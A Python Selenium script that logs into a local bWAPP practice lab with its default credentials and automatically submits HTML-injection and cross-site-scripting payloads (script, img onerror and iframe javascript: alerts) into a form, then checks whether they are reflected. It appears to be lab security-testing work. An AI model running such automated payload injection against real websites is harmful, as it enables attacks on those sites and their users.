from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from selenium.common.exceptions import UnexpectedAlertPresentException, StaleElementReferenceException


target_url = "http://192.168.1.36/bWAPP/login.php"

payloads = [
    '<h1>Injected</h1>',
    '<script>alert("HTML Injection")</script>',
    '<img src=x onerror=alert("HTML Injection")>',
    '<iframe src="javascript:alert(\'HTML Injection\')"></iframe>'
]

opts = Options()
opts.log.level = "trace"

driver = webdriver.Firefox(options=opts)

def handle_alert():
    try:
        WebDriverWait(driver, 5).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        alert.accept()  
        print("Alert handled")
    except UnexpectedAlertPresentException:
        print("No alert was present")

def login_and_navigate():
    
    driver.get(target_url)

    username = driver.find_element(By.XPATH, '//*[@id="login"]')
    username.send_keys('bee')
    
    password = driver.find_element(By.XPATH, '//*[@id="password"]')
    password.send_keys('bug')

    login_button = driver.find_element(By.XPATH, '/html/body/div[2]/form/button')
    login_button.click()

   
    wait = WebDriverWait(driver, 10)
    html_injection_option = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/form/select/option[3]')))
    html_injection_option.click()

    
    hack_button = driver.find_element(By.XPATH, '/html/body/div[2]/form/button')
    hack_button.click()

def test_html_injection():
    
    wait = WebDriverWait(driver, 10)
    
    
    for payload in payloads:
       
        first_name_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="firstname"]')))
        last_name_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="lastname"]')))

        print("Found input fields for First Name and Last Name.")

        try:
           
            first_name_input.clear()
            first_name_input.send_keys(payload)
		
            print("step 1 success")
           
            last_name_input.clear()
            last_name_input.send_keys(payload)
	     
	     
            print("step 2 success")
            
            last_name_input.send_keys(Keys.RETURN)
            time.sleep(2)  
            
            handle_alert()
	    
            print("step 3 success")
           
            if payload in driver.page_source:
                print(f"HTML Injection Successful with payload: {payload}")
                print("step 4 success")
            else:
                print(f"No HTML Injection detected with payload: {payload}")
                print("step 5 success")

            
            driver.back()
            time.sleep(2)
            
            print("step 6 success")

            
            first_name_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="firstname"]')))
            last_name_input = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="lastname"]')))

        except Exception as e:
            print(f"An error occurred during payload injection: {str(e)}")

    
    driver.quit()

login_and_navigate()
test_html_injection()
